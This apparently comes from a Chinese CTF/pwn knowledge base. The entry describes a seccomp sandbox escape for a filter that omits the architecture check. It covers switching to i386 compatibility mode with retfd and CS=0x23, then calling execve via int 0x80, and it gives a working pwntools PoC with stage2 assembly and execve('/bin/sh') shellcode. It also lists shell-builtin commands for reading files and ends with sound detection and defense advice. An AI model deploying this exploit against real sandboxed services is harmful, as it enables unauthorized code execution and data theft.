---
id: binary-pwn-sandbox-escape-seccomp-no-arch-check-i386-compat-execve
title: seccomp 黑名单未校验 arch：retf 切 32 位兼容模式用 int 0x80 execve 绕过，再用 shell 内建读 flag
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: seccomp-no-arch-check-i386-compat-execve
tags:
- pwn
- seccomp
- sandbox-escape
- shellcode
- i386
- compat-mode
- execve
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V183
  verified_at: '2026-11-06T20:00:48+08:00'
  notes: 已对照 90762 原文核对：seccomp dump 仅 LD [0] 取 sys_number、无 arch 比较；x86-64 黑名单为 59/322/2/85/57/58/87/88/0x136/0x137/0x86；retfd+CS=0x23 切 i386 兼容模式，int 0x80 execve=11 绕过；i386 open=5/read=3/write=4 与 openat=257 放行、shell 内建读 flag 均与原文一致。未复跑 exp。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-seccomp-no-arch-check-i386-compat-execve/
draft: false
kb_aliases:
- x32 shellcode 绕过 seccomp
- retfd 切换 32 位
- retf 0x23
- int 0x80 execve
- seccomp 未检查 arch
- 32 位兼容模式绕过
- shell 内建读 flag
---

## 一句话结论

当 seccomp 过滤器只比较 `sys_number`、不加载/比较 `seccomp_data.arch` 时，64 位进程可以用 32 位远返回（`retfd`，CS=0x23）切到 i386 兼容模式，执行 `int 0x80` 的 `execve`（i386 系统调用号 11）；过滤器只看到数字 11，绕过了针对 x86-64 `execve`(59) 的黑名单。拿到 shell 后，由于 `execve` 仍被禁，用 bash/dash 内建 `echo *` 与 `read line < flag; echo $line` 读取文件，不依赖外部 `cat`。

## 原理

- **seccomp_data 的两个关键字段**：`struct seccomp_data` 包含 `int nr`（偏移 0）、`__u32 arch`（偏移 4）、`instruction_pointer`、`args[6]`。BPF 过滤器如果只执行 `LD [0]` 取 syscall 号，就完全不知道调用来自哪个 ABI。
- **本题过滤器**：`seccomp-tools dump` 显示规则先取 `A = sys_number`，然后 `if (A < 0x40000000) goto 0003; return KILL`，接着逐一比较 x86-64 的 `execve`(59)、`execveat`(322)、`open`(2)、`creat`(85)、`fork`(57)、`vfork`(58)、`unlink`(87)、`symlink`(88)、`process_vm_readv/writev`、`uselib`，命中则 KILL，其余 ALLOW。它没有 `LD [4]` 取 arch，也没有与 `AUDIT_ARCH_X86_64` 比较。
- **32 位兼容模式**：x86-64 Linux 进程可以通过 32 位远返回（`retfd`，操作数大小 32）弹出 EIP 和 CS；把 CS 设为 0x23（`__USER32_CS`，32 位用户代码段，RPL=3），EIP 设为低于 4GB 的 32 位代码地址，即可进入 i386 兼容模式执行 32 位指令。
- **int 0x80 的系统调用号不同**：i386 ABI 的 `execve` 是 11，而 x86-64 是 59。过滤器只认 59，因此 11 直接通过黑名单；`A < 0x40000000` 的分支也通过（11 很小）。注意官方 x32 ABI 的系统调用号带 `0x40000000` 位，会被这条规则 KILL，所以这里利用的是 i386 兼容模式，不是 x32 ABI（文章口语称 x32）。
- **为什么需要先 mprotect/mmap**：32 位 shellcode 必须位于可执行内存。过滤器没有禁 `mprotect`/`mmap`，所以可以先用 ROP 调 `mprotect(heap, 0x1000, 7)`，或直接用 stage2 的 x86-64 shellcode 调 `mmap(0x1337000, 0x1000, 7, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0)`，再把 i386 shellcode `read` 进去。
- **无 execve 读 flag**：`execve` 仍被黑名单挡住，`cat`/`ls` 等外部命令无法启动。但 shell 内建不经过 `execve`：
  - `echo *`：由 shell 自己做 glob（`readdir`/`getdents`）并 `write` 输出当前目录文件名，可用来发现随机命名的 flag 文件；
  - `read line < flag.txt; echo $line`：重定向由 shell 调用 `openat`（x86-64 号 257，未被禁）打开文件，`read` 和 `echo` 都是内建，不产生 `execve`。
  因此即使 `execve`、`open` 被禁，只要 `openat` 和 `read`/`write` 放行，仍能读文件。
- **边界**：需要内核开启 IA32 兼容（`CONFIG_IA32_EMULATION`）且 CPU 支持；远返回目标必须低于 4GB；若过滤器额外检查 arch 或把 i386 系统调用号也加入黑名单，该绕过失效；若 shell 使用 `open`(2) 而不是 `openat`(257)，重定向也会被杀。

## 触发条件

- seccomp 过滤器只加载 `seccomp_data.nr`，没有加载/比较 `arch`；黑名单只覆盖 x86-64 系统调用号（或至少没有覆盖 i386 的 `execve`=11）。
- 过滤器允许 `mmap`/`mprotect`、`read`、`write` 等准备阶段所需的系统调用。
- 目标进程是 64 位，能执行 32 位远返回并进入 i386 兼容模式；内核启用 IA32 模拟。
- 有可写可执行内存（或能通过 mprotect 制造），用于放置 i386 shellcode；`read` 可达以加载 stage2。
- 系统里有可执行的 `/bin/sh`（32 位或 64 位均可；64 位 shell 的内建同样不需要 execve）。

## 利用步骤

1. `seccomp-tools dump ./target` 或读取 BPF：确认没有 `LD [4]`/arch 比较；记录被禁的 x86-64 系统调用号与默认动作。
2. 先用 ROP 或既有原语调用 `mprotect(heap, 0x1000, 7)`，把一块堆页改为 RWX；或让 stage2 自己 `mmap` 一块固定地址的 RWX 页。
3. 放置 stage2（x86-64）shellcode：`mmap(0x1337000, 0x1000, 7, 0x32, -1, 0)`；`read(0, 0x1337590, 100)` 读入 stage3；然后构造 32 位远返回栈帧：`[esp] = 0x1337590`、`[esp+4] = 0x23`，执行 `retfd`。
4. stage3（i386）shellcode 执行 `execve("/bin/sh", NULL, NULL)`：`xor ecx,ecx; mul ecx; push ecx; push 0x68732f2f; push 0x6e69622f; mov ebx,esp; mov al,0xb; int 0x80`。`int 0x80` 的 syscall 号为 11，过滤器放行。
5. 进入 shell 后先 `echo *` 列出当前目录，找到 flag 文件名（远程环境常用随机名）。
6. 执行 `read line < flag.txt; echo $line` 读取内容；不要用 `cat`/`ls` 等外部命令，否则会触发被禁的 `execve` 而被杀。
7. 若 `read` 重定向仍失败，检查 shell 是否改用 `open`(2)：可改用 i386 的 `open`(5)/`read`(3)/`write`(4) 直接写 shellcode 读文件（i386 的 `open` 号 5 也不在黑名单里）。

## PoC

```python
from pwn import *

context.arch = "amd64"

# stage2：x86-64 准备 RWX 页、读入 stage3、32 位远返回
stage2 = asm("""
    xor rax, rax
    mov al, 9
    mov rdi, 0x1337000
    mov rsi, 0x1000
    mov rdx, 7
    mov r10, 0x32          /* MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED */
    mov r8, 0xffffffff
    mov r9, 0
    syscall                /* mmap(0x1337000, 0x1000, 7, 0x32, -1, 0) */

    xor rax, rax
    xor rdi, rdi
    mov rsi, 0x1337590
    mov rdx, 100
    syscall                /* read(0, 0x1337590, 100) */

    xor rsp, rsp
    mov esp, 0x1337160
    mov dword ptr [esp+4], 0x23
    mov dword ptr [esp], 0x1337590
    retfd                  /* 32 位远返回：EIP=0x1337590, CS=0x23 */
""")

# stage3：i386 execve("/bin/sh", NULL, NULL)，int 0x80 号 11
stage3 = bytes.fromhex(
    "31c9"          # xor ecx, ecx
    "f7e1"          # mul ecx
    "51"            # push ecx
    "682f2f7368"    # push 0x68732f2f  ("//sh")
    "682f62696e"    # push 0x6e69622f  ("/bin")
    "89e3"          # mov ebx, esp
    "b00b"          # mov al, 0xb
    "cd80"          # int 0x80
)

# 伪代码：先 ROP 到 stage2，再发送 stage3
# rop.mprotect(heap, 0x1000, 7); rop.raw(stage2)
io.send(stage2)
io.send(stage3)
io.interactive()
```

进入 shell 后：

```bash
echo *
read line < flag.txt; echo $line
```

## 变体与关联

- **官方 x32 ABI**：系统调用号带 `0x40000000` 位；本题过滤器会 KILL `A >= 0x40000000`，因此不能用 x32 ABI，必须用 i386 兼容模式。
- **过滤器检查 arch**：若过滤器 `LD [4]` 并比较 `AUDIT_ARCH_X86_64`，i386 兼容模式会被杀；此时改用 openat2/pipe/splice 或自修改 syscall 等白名单/黑名单绕过，见 [[binary-pwn-sandbox-escape-seccomp-openat2-pipe-splice]] 与 [[binary-pwn-sandbox-escape-self-modifying-shellcode-seccomp-orw]]。
- **i386 open 也绕过**：i386 的 `open` 号 5 同样不在 x86-64 黑名单里；若需要直接 ORW，可写 i386 `open/read/write` shellcode，不必依赖 shell 内建。
- **shell 内建读文件**：即使没有 32 位切换，只要存在一个不经过 execve 的 shell，且 `openat`/`read`/`write` 放行，`echo *` 与 `read line < file` 就能读文件；这是 seccomp 禁 execve 后的通用后利用技巧。
- **关联**：[[binary-pwn-heap-freehook-setcontext61-bridge-orw]]（ROP 到 mprotect/栈迁移）、[[binary-pwn-stack-ret2shellcode-mprotect-bss-rwx-page]]（mprotect RWX 后执行 shellcode）。

## 检测与防御

- **seccomp 必须校验 arch**：在 BPF 中加载 `offsetof(struct seccomp_data, arch)`，与 `AUDIT_ARCH_X86_64` 比较；若不匹配直接 `SECCOMP_RET_KILL_PROCESS`。若确实需要兼容 32 位进程，再单独允许 `AUDIT_ARCH_I386`，并按 i386 系统调用号建立独立黑名单/白名单。
- **黑名单不如白名单**：黑名单容易漏掉同一语义的不同 ABI/系统调用号（如 x86-64 `open` 与 i386 `open`、`openat2`、`openat`）；优先使用只放行必要系统调用的白名单，并做参数级限制。
- **禁用 IA32 模拟**：不需要 32 位兼容时，内核关闭 `CONFIG_IA32_EMULATION`，从根上消除 `int 0x80` 路径。
- **检测**：审计日志中关注 64 位进程突然出现 `int 0x80` 兼容系统调用、或 seccomp 日志显示 `arch` 与预期不符；对服务进程同时监控 `execve` 被拦截后仍出现的 shell 交互（`echo *`、`read` 重定向）也可作为异常行为线索。
